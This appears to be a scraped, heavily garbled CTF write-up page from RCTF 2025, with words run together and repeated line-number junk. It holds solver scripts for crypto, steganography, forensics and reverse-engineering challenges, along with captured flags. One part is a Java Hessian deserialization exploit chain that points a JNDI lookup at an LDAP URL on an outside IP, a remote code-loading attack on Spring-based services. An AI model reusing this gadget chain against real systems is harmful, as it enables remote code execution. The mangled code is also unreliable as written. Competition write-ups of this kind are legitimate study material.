Exception { Assert.hasText(this.targetBeanName,"Property 'targetBeanName' is required"); super.afterPropertiesSet(); } publicClass<?> getObjectType() { returnObjectFactory.class; } protectedObjectFactory<Object> createInstance() { BeanFactory beanFactory =this.getBeanFactory(); Assert.state(beanFactory !=null,"No BeanFactory available"); Assert.state(this.targetBeanName !=null,"No target bean name specified"); returnnew TargetBeanObjectFactory(beanFactory,this.targetBeanName); } privatestaticclassTargetBeanObjectFactoryimplementsObjectFactory<Object>,Serializable{ privatefinalBeanFactory beanFactory; privatefinalString targetBeanName; publicTargetBeanObjectFactory(BeanFactory beanFactory, String targetBeanName) { this.beanFactory = beanFactory; this.targetBeanName = targetBeanName; } publicObject getObject() throws BeansException { returnthis.beanFactory.getBean(this.targetBeanName); } }}
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//packageorg.springframework.jndi.support;importjava.util.Collections;importjava.util.HashMap;importjava.util.HashSet;importjava.util.Map;importjava.util.Set;importjavax.naming.NameNotFoundException;importjavax.naming.NamingException;importorg.springframework.beans.BeansException;importorg.springframework.beans.factory.BeanDefinitionStoreException;importorg.springframework.beans.factory.BeanFactory;importorg.springframework.beans.factory.BeanNotOfRequiredTypeException;importorg.springframework.beans.factory.NoSuchBeanDefinitionException;importorg.springframework.beans.factory.NoUniqueBeanDefinitionException;importorg.springframework.beans.factory.ObjectProvider;importorg.springframework.core.ResolvableType;importorg.springframework.jndi.JndiLocatorSupport;importorg.springframework.jndi.TypeMismatchNamingException;importorg.springframework.lang.Nullable;publicclassSimpleJndiBeanFactoryextendsJndiLocatorSupportimplementsBeanFactory{ privatefinalSet<String> shareableResources = new HashSet(); privatefinalMap<String, Object> singletonObjects = new HashMap(); privatefinalMap<String, Class<?>> resourceTypes = new HashMap(); publicSimpleJndiBeanFactory() { this.setResourceRef(true); } publicvoid addShareableResource(String shareableResource) { this.shareableResources.add(shareableResource); } publicvoid setShareableResources(String... shareableResources) { Collections.addAll(this.shareableResources, shareableResources); } publicObject getBean(String name) throws BeansException { returnthis.getBean(name, Object.class); } public<T> T getBean(String name, Class<T> requiredType) throws BeansException { try{ return(T)(this.isSingleton(name) ?this.doGetSingleton(name, requiredType) :
this.lookup(name, requiredType)); }catch(NameNotFoundException var4) { thrownew NoSuchBeanDefinitionException(name,"not found in JNDI environment"); }catch(TypeMismatchNamingException ex) { thrownew BeanNotOfRequiredTypeException(name, ex.getRequiredType(), ex.getActualType()); }catch(NamingException ex) { thrownew BeanDefinitionStoreException("JNDI environment", name,"JNDI lookup failed", ex); } } publicObject getBean(String name,@NullableObject... args) throws BeansException { if(args !=null) { thrownew UnsupportedOperationException("SimpleJndiBeanFactory does not support explicit bean creation arguments"); }else{ returnthis.getBean(name); } } public<T> T getBean(Class<T> requiredType) throws BeansException { return(T)this.getBean(requiredType.getSimpleName(), requiredType); } public<T> T getBean(Class<T> requiredType,@NullableObject... args) throws BeansException { if(args !=null) { thrownew UnsupportedOperationException("SimpleJndiBeanFactory does not support explicit bean creation arguments"); }else{ return(T)this.getBean(requiredType); } } public<T> ObjectProvider<T> getBeanProvider(finalClass<T> requiredType) { returnnew ObjectProvider<T>() { publicT getObject() throws BeansException { return(T)SimpleJndiBeanFactory.this.getBean(requiredType); } publicT getObject(Object... args) throws BeansException { return(T)SimpleJndiBeanFactory.this.getBean(requiredType, args); } @Nullable publicT getIfAvailable() throws BeansException { try{ return(T)SimpleJndiBeanFactory.this.getBean(requiredType); }catch(NoUniqueBeanDefinitionException ex) { throwex; }catch(NoSuchBeanDefinitionException var3) { returnnull; } } @Nullable publicT getIfUnique() throws BeansException { try{ return(T)SimpleJndiBeanFactory.this.getBean(requiredType); }catch(NoSuchBeanDefinitionException var2) { returnnull; } } }; } public<T> ObjectProvider<T> getBeanProvider(ResolvableType requiredType) { thrownew UnsupportedOperationException("SimpleJndiBeanFactory does not support resolution by ResolvableType"); } publicboolean containsBean(String name) { if(!this.singletonObjects.containsKey(name) && !this.resourceTypes.containsKey(name)) { try{ this.doGetType(name); returntrue; }catch(NamingException var3) { returnfalse; } }else{ returntrue; } } publicboolean isSingleton(String name) throws NoSuchBeanDefinitionException { returnthis.shareableResources.contains(name); } publicboolean isPrototype(String name) throws NoSuchBeanDefinitionException { return!this.shareableResources.contains(name); } publicboolean isTypeMatch(String name, ResolvableType typeToMatch) throws NoSuchBeanDefinitionException { Class<?> type =this.getType(name); returntype !=null&& typeToMatch.isAssignableFrom(type); } publicboolean isTypeMatch(String name,@NullableClass<?> typeToMatch) throws NoSuchBeanDefinitionException { Class<?> type =this.getType(name); returntypeToMatch ==null|| type !=null&& typeToMatch.isAssignableFrom(type); } @Nullable publicClass<?> getType(String name) throws NoSuchBeanDefinitionException { returnthis.getType(name,true); } @Nullable publicClass<?> getType(String name, boolean allowFactoryBeanInit) throws NoSuchBeanDefinitionException { try{ returnthis.doGetType(name); }catch(NameNotFoundException var4) { thrownew NoSuchBeanDefinitionException(name,"not found in JNDI environment"); }catch(NamingException var5) { returnnull; } } publicString[] getAliases(String name) { returnnew String[0]; } private<T> T doGetSingleton(String name,@NullableClass<T> requiredType) throws NamingException { synchronized(this.singletonObjects) { Object singleton =this.singletonObjects.get(name); if(singleton !=null) { if(requiredType !=null&& !requiredType.isInstance(singleton)) { thrownew TypeMismatchNamingException(this.convertJndiName(name), requiredType, singleton.getClass()); }else{ return(T)singleton; } }else{ T jndiObject = (T)this.lookup(name, requiredType); this.singletonObjects.put(name, jndiObject); returnjndiObject; } } } privateClass<?> doGetType(String name) throws NamingException { if(this.isSingleton(name)) { returnthis.doGetSingleton(name, (Class)null).getClass(); }else{ synchronized(this.resourceTypes) { Class<?> type = (Class)this.resourceTypes.get(name); if(type ==null) { type =this.lookup(name, (Class)null).getClass(); this.resourceTypes.put(name, type); } returntype; } } }}
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linepackageorg.example;importcom.rctf.server.tool.Maybe;importorg.springframework.jndi.support.SimpleJndiBeanFactory;importsun.misc.Unsafe;importysomap.core.util.ReflectionHelper;importjava.lang.reflect.Constructor;importjava.lang.reflect.Field;importjava.lang.reflect.InvocationHandler;importjava.lang.reflect.Proxy;importjava.security.SignedObject;importjava.util.HashMap;importjava.util.Map;importjava.util.TreeMap;importjava.util.TreeSet;publicclassExp{ publicstaticvoidmain(String[] args)throws Exception{ FieldtheUnsafe=Unsafe.class.getDeclaredField("theUnsafe"); theUnsafe.setAccessible(true); Unsafeunsafe=(Unsafe) theUnsafe.get(null); Class<?> name = Class.forName("org.springframework.beans.factory.config.ObjectFactoryCreatingFactoryBean$TargetBeanObjectFactory"); Objecto1=unsafe.allocateInstance(name); SimpleJndiBeanFactorysimpleJndiBeanFactory=newSimpleJndiBeanFactory(); unsafe.getAndSetObject(o1,unsafe.objectFieldOffset(name.getDeclaredField("beanFactory")),simpleJndiBeanFactory); unsafe.getAndSetObject(o1,unsafe.objectFieldOffset(name.getDeclaredField("targetBeanName")),"ldap://112.124.59.213:
50389/a1ab9c"); InvocationHandlero=(InvocationHandler) unsafe.allocateInstance(Class.forName("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler")); longobjectFactory=unsafe.objectFieldOffset(Class.forName("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler").getDeclaredField("objectFactory")); unsafe.getAndSetObject(o,objectFactory,o1); Maybemaybe=newMaybe(o); TreeSettreeSet=makeTreeSet(maybe, maybe); Stringserialize=HessianFactory.serialize(treeSet); System.out.println(serialize);// HessianFactory.deserialize(serialize); } publicstaticTreeSetmakeTreeSet(Object v1, Object v2)throwsException { TreeMap<Object,Object> m =newTreeMap<>(); ReflectionHelper.setFieldValue(m,"size",2); ReflectionHelper.setFieldValue(m,"modCount",2); Class<?> nodeC = Class.forName("java.util.TreeMap$Entry"); ConstructornodeCons=nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC); ReflectionHelper.setAccessible(nodeCons); Objectnode=nodeCons.newInstance(v1,newObject[0],null); Objectright=nodeCons.newInstance(v2,newObject[0], node); ReflectionHelper.setFieldValue(node,"right", right); ReflectionHelper.setFieldValue(m,"root", node); TreeSetset=newTreeSet(); ReflectionHelper.setFieldValue(set,"m", m); returnset; }}
ounter(lineounter(lineounter(lineounter(line1.8ssDGBTssUI2.r1783.https://mateusz.viste.fr/mateusz.ogg4.16TofYbGd86C7S6JuAuhGkX4fbmC9QtzwT
ounter(line8ssDGBTssUI
ounter(linehttps://www.vogons.org/viewtopic.php?t=44947
ounter(linesvn cosvn://svn.mateusz.fr/dosmid dosmid-svn
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineroot@DESKTOP-LV8V93U:/home/2025RCTF/dosmid-svn
# svn log-r200:
350|egrep-i "playlist|m3u|freeze|empty|loop|soft"freezed v0.9totagsfreezed v0.9.1totagssequential playingofplaylists, inspiredbya patch proposedbyGraham Wisemanfreezed v0.9.2intotagsfreezed v0.9.3totagsm3u playlist uses fio calls insteadoffopen()andfriendsfix:/random was always playingfirstsongofthe m3u list, now itisrandomfromthestartfixed playlist gap delay computation (fixed/delay behavior, too)freezed v0.9.4totagsfreezed v0.9.5totagsroot@DESKTOP-LV8V93U:/home/2025RCTF/dosmid-svn
# svn log-r1:
200|egrep-i "playlist|m3u|freeze|empty|loop|soft"donotfreezewhennoMPU401isrespondingsetting volumeinsoftware again, reinstateddefaultdelay=2ms, improved keyboard reaction timesandadjusted documentationadded INT28h powersaving during idle loopsdetectingwhena playlistispassedoncommand-line (butnom3u support yet)firstsemi-experimental M3U supportfreezed v0.6intotagsfreezed v0.6.1intotagsfreezed v0.7intagsfreezed v0.8intotagsadded anemptyandself-documented configuration file2s silence gapisinsertedonlyinplaylist mode (noreasontowait2sfora single file)fixed freezingwhenfedwithanemptyplaylistif too many'soft'errors occurinarow, dosmid aborts (protects against'soft errors loops', typicallywithplaylist filledwithnon-existing files)adda note aboutemptytitles,whennotextual data could be foundinthe midi fileignoreleadingemptytitle linesfreezed v0.9totagsroot@DESKTOP-LV8V93U:/home/2025RCTF/dosmid-svn
# svn log-r1:
200|grep-n "soft"260:
setting volumeinsoftware again, reinstateddefaultdelay=2ms, improved keyboard reaction timesandadjusted documentation712:if too many'soft'errors occurinarow, dosmid aborts (protects against'soft errors loops', typicallywithplaylist filledwithnon-existing files)root@DESKTOP-LV8V93U:/home/2025RCTF/dosmid-svn
# svn log-r1:
200|sed-n'710,720p'r178|mv_fox|2016-05-0901:21:38+0800(Mon,09May2016)|1lineif too many'soft'errors occurinarow, dosmid aborts (protects against'soft errors loops', typicallywithplaylist filledwithnon-existing files)------------------------------------------------------------------------r179|mv_fox|2016-05-0901:25:49+0800(Mon,09May2016)|1linereplaced sleep() callswithequivalent udelay() calls (makes thebinary128bytes lighter)------------------------------------------------------------------------r180|mv_fox|2016-05-1002:04:00+0800(Tue,10May2016)|1linefetching more textual datafromMIDI files (text events, tracks titles, marker events...)anddisplaying itona little scrollingwindow
ounter(liner178
ounter(lineounter(lineounter(lineounter(line主页里想联系我吗？我的电子邮件地址与此网页的地址几乎相同（firstname@lastname.fr）。令人惊讶的是，很多人难以念出我的名字，所以这里附上我的名字（图片来自 Wikimedia）。https://mateusz.viste.fr/mateusz.ogg
ounter(linegopher://gopher.viste.fr
ounter(line16TofYbGd86C7S6JuAuhGkX4fbmC9QtzwT
ounter(linehttps://www.spammimic.com
ounter(lineDon't just listen to the sound; this file is hiding an 'oldrelic.' Try looking for the 'comments' that the player isn't supposedtosee.
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line#!/usr/bin/env python3
# -*- coding: utf-8 -*-"""Decode hidden message from feel.wav binary-bar waveform.Expected output: I Feel Fantastic heyheyhey"""importnumpyasnpfromscipy.ioimportwavfiledefread_mono_pcm(path:
str): rate, data = wavfile.read(path) data = data.astype(float) ifdata.ndim >1: # 立体声只取一个声道 data = data[:,0] returnrate, datadefcompute_envelope(data: np.ndarray, window_size:
int=100) -> np.ndarray: """对绝对值做滑动平均，得到能量包络""" abs_data = np.abs(data) n =len(abs_data) // window_size * window_size reshaped = abs_data[:n].reshape(-1, window_size) env = reshaped.mean(axis=1) returnenvdefbinarize_envelope(env: np.ndarray) -> np.ndarray: """根据能量双峰分布自动求阈值，得到 0/1 序列""" median_env = np.median(env) low_level = np.median(env[env < median_env]) high_level = np.median(env[env > median_env]) threshold = (low_level + high_level) /2.0 bits_raw = (env > threshold).astype(int) returnbits_rawdefrun_length_encode(bits: np.ndarray): runs = [] current = bits[0] length =1 forbinbits[1:]: ifb == current: length +=1 else: runs.append((current, length)) current = b length =1 runs.append((current, length)) returnrunsdefexpand_runs_to_bits(runs): """ 每一串 0/1 在时间上会持续若干个“单位长度”， 大部分长度约是 22 的倍数，这里固定 base_unit = 22， 再按 round(length / base_unit) 还原成重复 bit。 """ base_unit =22.0
# 针对 feel.wav 这题是固定的 bit_list = [] forv, linruns: n =int(round(l / base_unit)) ifn <=0: n =1 bit_list.extend([v] * n) returnbit_listdefbits_to_ascii(bit_list): bitstr ="".join(str(b)forbinbit_list) bitstr = bitstr[:
len(bitstr) //8*8] # 截断到 8 的倍数 bytes_vals = [int(bitstr[i : i +8],2)foriinrange(0,len(bitstr),8)] msg ="".join(chr(b)forbinbytes_vals) returnmsg, bytes_vals, bitstrdefdecode_hidden_message(path:
str): rate, data = read_mono_pcm(path) env = compute_envelope(data, window_size=100) bits_raw = binarize_envelope(env) runs = run_length_encode(bits_raw) bit_list = expand_runs_to_bits(runs) msg, bytes_vals, bitstr = bits_to_ascii(bit_list) returnmsg, bytes_vals, bitstrif__name__ =="__main__": # 把这里改成你的文件名（与脚本在同一路径下） wav_path ="feel.wav" msg, bytes_vals, bitstr = decode_hidden_message(wav_path) print("Decoded bytes:", bytes_vals) print("Decoded message:") print(msg)
ounter(lineIFeel Fantastic heyheyhey
ounter(linehttps://archive.org/details/youtube-rLy-AwdCOmI
ounter(lineounter(lineounter(linerLy-AwdCOmICreepyblog2009-04-15
ounter(lineounter(lineounter(linehttps://androidworld.com/prod68.htmChrisWillis2004
ounter(linehttps://www.findagrave.com/memorial/63520325/john-louis-bergeron
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineimport base64, jsonfrom Crypto.Cipher import AESaesKey_b64 ="WzUsMTM5LDI0NSwyMjAsMjMxLDQ2LDIzNCwxNDYsMjQ4LDIxMSwyLDIxMywyLDE2NSw5OCwxMTgsMTAzLDE2MiwzLDE1MCw0LDUzLDE3OSwxOTQsODQsMjA3LDQ1LDI0NSw4OCwxNzksMTkzLDEwMV0="aesIV_b64 ="WzEyNCwyMzIsMjU0LDE5LDI1MCw0OSw1MCw4MywyMjksMjQ0LDI4LDIyMiw4MywzMywyMDIsNl0="data_b64 ="N2M3N2ZlN2ExYTdhZGMxY2E3MmZhMzY4MzgxMjUxMjQ5ZDZlYjAwNDQwZWJhYmQ2ZDc4MTVkMjE2OTVmMjAwNzRkY2JmYjgwYmExZTVjMjc5ZWY1NzZhNTQxMTU2YTQxZGI0NjQ3MGNlYTIzMDVkOTFlNDcxN2MyMTljNGQwNWJhYjRlMGQ5Zjg1MTA5MDNmZGQyNTM1M2ZjODI5NmY3MjgxYTEyODNkODIzMDQ1Y2NkYTI4MDI3OTc2NTljNzUzNzI0M2U0MmRhMTQ4MGY4ZDg0ZWQ2YTRjMDA1MjUyNWRjYWIwMDk2M2MyODA1MGJmNTEzNjA2NzNhODdiOTNiZDg1NTNkNWU3NDMzMjk3YmRkNTRiOTQyMjJjZDUzMzg3NzIwMmYwNTU0MDNiMjRlODU5NzkwY2Q5MzliYTZjNGVmMDNjMTkzYTU0Zjc3NTUyY2MyYzJhOThlMmI3NDhmZWViZGY0ZDc5YTM5YzBkZGFlZjUyMzVmZjY4YWYxM2Y0NjFiYTkzMTAwMjhhODY3NWEzOGNiNGU3MTc0YmY1Y2QwYzY4YzdiOGE5NjczMGNlMTEyMGJjNWRjNWQ3ZDNiNGY0NTkxMzc1MGRiNzJiZjQ3NzU5YWQwNGRiOWQxYTBlYjlhMzRmOGZlNDZmMDM5OGI1YWI5YWMzMDBiZTlkNmU1MTA4ZTM1ZWQ2YTRiYTA1MTJmNjJkMjM1YTc1YzQyMTc2MGFkOWNlZWU3YWYyYjM4OTk1MjYxZGJkY2E1NDZk=="data_hex = base64.b64decode(data_b64).decode()
# 1. Base64 decodekey_list = json.loads(base64.b64decode(aesKey_b64).decode())iv_list = json.loads(base64.b64decode(aesIV_b64).decode())
# 2. Convert to byteskey_bytes = bytes(key_list)iv_bytes = bytes(iv_list)
# 3. data hex → bytescipher_bytes = bytes.fromhex(data_hex)
# 4. AES-CBC decryptcipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)plaintext = cipher.decrypt(cipher_bytes)
# 5. remove PKCS7 paddingpad = plaintext[-1]plaintext = plaintext[:-pad]print(plaintext.decode(errors="ignore"))
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(linefromsage.allimport*fromCrypto.CipherimportAESfromhashlibimportmd5r, d =16381,41R.<x> = GF(2)[]S.<X> = R.quotient(x^r -1)M = x^r -1BMAX = r//3nonce =b"suanp01y"line1, line2 =open("output.txt","r").read().splitlines()Hstr = line1.split("=",1)[1].strip() H = S(Hstr) ct =bytes.fromhex(line2.strip())defwt_R(poly_R): returnsum(int(c)forcinpoly_R.list())defeea_ratrec(F_R, M_R, B): r0, r1 = M_R, F_R s0, s1 = R(1), R(0) t0, t1 = R(0), R(1) deftry_pair(A, B): ifAandBandA.degree() <= BMAXandB.degree() <= BMAX: A, B = A.monic(), B.monic() if((F_R*B - A) % M_R) ==0: returnA, B returnNone cand = try_pair(r1, t1) ifcand:
returncand whiler1 !=0: q, r2 = r0.quo_rem(r1) r0, r1 = r1, r2 s0, s1 = s1, s0 - q*s1 t0, t1 = t1, t0 - q*t1 cand = try_pair(r0, t0) ifcand:
returncand cand = try_pair(r1, t1) ifcand:
returncand raiseRuntimeError("no bounded solution")t0_R = t1_R =Nonegood_delta =Nonefordeltainrange(r): H_delta = S(X^delta) * H F_delta = H_delta.lift() try: A, B = eea_ratrec(F_delta, M, BMAX) exceptRuntimeError: continue ifwt_R(B) == dorwt_R(A) == d: t0_R, t1_R = (B, A)ifwt_R(B) == delse(A, B) good_delta = delta print(f"[+] 找到可重构的 δ ={delta}，wt(t0)={wt_R(t0_R)}, wt(t1)={wt_R(t1_R)}") breakift0_RisNone: raiseSystemExit("[-] 遍历 δ 未能重构到 41-稀疏分母")defdecrypt_try(h0_S): key = md5(str(h0_S).encode()).digest() returnAES.new(key=key, nonce=nonce, mode=AES.MODE_CTR).decrypt(ct)t0_S = S(t0_R)flag =Noneforkinrange(r): h0 = S(X^k) * t0_S pt = decrypt_try(h0) ifpt.startswith(b"RCTF{")andpt.rstrip().endswith(b"}")andall(32<= b <=126forbinpt): flag = pt.decode() print("[+] FOUND flag:", flag) break"""[+] 找到可重构的 δ = 12921 ，wt(t0)=41, wt(t1)=41[+] FOUND flag: RCTF{i_just_h0pe_ChatGPT_doesnt_inst@ntly_so1ve_thi5_one.}"""
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line[package]name ="exp"version ="0.1.0"edition ="2024"[dependencies]ark-bls12-381 ="0.5"ark-ec ="0.5"ark-ff ="0.5"ark-serialize ="0.5"hex ="0.4"
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineuse std::io::{Read, Write};use std::
net::
TcpStream;use ark_bls12_381::{Bls12_381, Fr, G1Affine, G1Projective, G2Affine, G2Projective};use ark_ec::{pairing::
Pairing, CurveGroup, PrimeGroup};use ark_ff::{PrimeField, Field};use ark_serialize::{CanonicalDeserialize, CanonicalSerialize};typeGT=::
TargetField;fnparse_g1_hex(s: &str)-> G1Projective { letb=hex::
decode(s).expect("bad hex g1"); leta=G1Affine::
deserialize_compressed(&*b).expect("bad g1"); G1Projective::
from(a)}fnparse_g2_hex(s: &str)-> G2Projective { letb=hex::
decode(s).expect("bad hex g2"); leta=G2Affine::
deserialize_compressed(&*b).expect("bad g2"); G2Projective::
from(a)}fnparse_gt_hex(s: &str)-> GT { letb=hex::
decode(s).expect("bad hex gt"); GT::
deserialize_compressed(&*b).expect("bad gt")}fnhex_g1(p: &G1Projective)-> String { let a: G1Affine = (*p).into_affine(); letmutv=Vec::
new(); a.serialize_compressed(&mut v).unwrap(); hex::
encode(v)}fnhex_g2(p: &G2Projective)-> String { let a: G2Affine = (*p).into_affine(); letmutv=Vec::
new(); a.serialize_compressed(&mut v).unwrap(); hex::
encode(v)}fnhex_gt(x: >)-> String { letmutv=Vec::
new(); x.serialize_compressed(&mut v).unwrap(); hex::
encode(v)}fnxor_in_place(a: &mut [u8], b: &[u8]){ for(x, y) in a.iter_mut().zip(b.iter()) { *x ^= *y; }}fnmain()-> std::io::
Result<()> { // 连接远端 lethost=std::
env::
args().nth(1).unwrap_or_else(||"1.14.196.78:
42601".to_string()); letmutsock=TcpStream::
connect(host)?; // 读首行 banner letmutline=String::
new(); letmutbuf=[0u8;4096]; // 读到换行即可 loop { letn=sock.read(&mut buf)?; ifn ==0{break; } line.push_str(&String::
from_utf8_lossy(&buf[..n])); ifline.contains('n') {break; } } letline=line.lines().next().unwrap().trim().to_string(); // 拆分 8 段: id|dst|pk|q|c1|c2|c3|enc_flag letmutit=line.split('|'); let_id_hex=it.next().expect("id");[图片已移除] let_dst_hex=it.next().expect("dst"); letpk_hex=it.next().expect("pk"); letq_hex=it.next().expect("q"); letc1_hex=it.next().expect("c1"); letc2_hex=it.next().expect("c2"); letc3_hex=it.next().expect("c3"); letenc_hex=it.next().expect("enc"); assert!(it.next().is_none(),"more parts than expected"); // 反序列化 let pk: GT = parse_gt_hex(pk_hex); let q: G2Projective = parse_g2_hex(q_hex); let c1: GT = parse_gt_hex(c1_hex); let c2: G1Projective = parse_g1_hex(c2_hex); let c3: G2Projective = parse_g2_hex(c3_hex); letmutenc=hex::
decode(enc_hex).expect("bad enc hex"); let mut delta_u64: u64 =1; letkey_hex=loop { letdelta=Fr::
from(delta_u64); letc1p=c1 * pk.pow(delta.into_bigint()); letc2p=c2 + G1Projective::
generator() * delta; letc3p=c3 + q * delta; letout=format!( "{}|{}|{}n", hex_gt(&c1p), hex_g1(&c2p), hex_g2(&c3p), ); sock.write_all(out.as_bytes())?; letmutresp=String::
new(); sock.read_to_string(&mut resp)?; letresp=resp.trim(); ifresp =="bad"|| resp =="no"{ delta_u64 +=1; continue; }else{ breakresp.to_string(); } }; letkey=hex::
decode(key_hex).expect("bad key hex"); letenc_len=enc.len(); assert!(key.len() >= enc_len); xor_in_place(&mut enc, &key[..enc_len]); println!("{}", String::
from_utf8_lossy(&enc)); Ok(())}
ounter(lineounter(lineounter(lineounter(lineounter(lineC:
Users28421Desktopexp>cargo run --release Compilingexpv0.1.0(C:
Users28421Desktopexp) Finished`release`profile [optimized] target(s) in1.65s Running`targetreleaseexp.exe`RCTF{ElGamal-style_re-randomization_attack_still_break_modern_schemes_7ec932b22988}
ounter(lineounter(lineHe said that ifallthe key modifications involved in anti-debugging are identified, the flag can be retrieved.your flag is RCTF{AntiDbg_KeyM0d_2025_R3v3rs3}程序执行完毕，按下任意键退出...
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line.text:
0040151D loc_40151D:.text:
0040151D mov ebx,22222222h.text:
00401522 mov eax, dword_404018.text:
00401527 mov [ebp-88h], eax.text:
0040152D push 0.text:
0040152F push 0.text:
00401531 push offset sub_401130 ; 回调.text:
00401536 call ds:
EnumUILanguagesA.text:
0040153C mov [ebp-194h], eax.text:
00401542 mov ecx, dword_40440C ; key 指针放到 [ebp-190h].text:
00401548 mov [ebp-190h], ecx
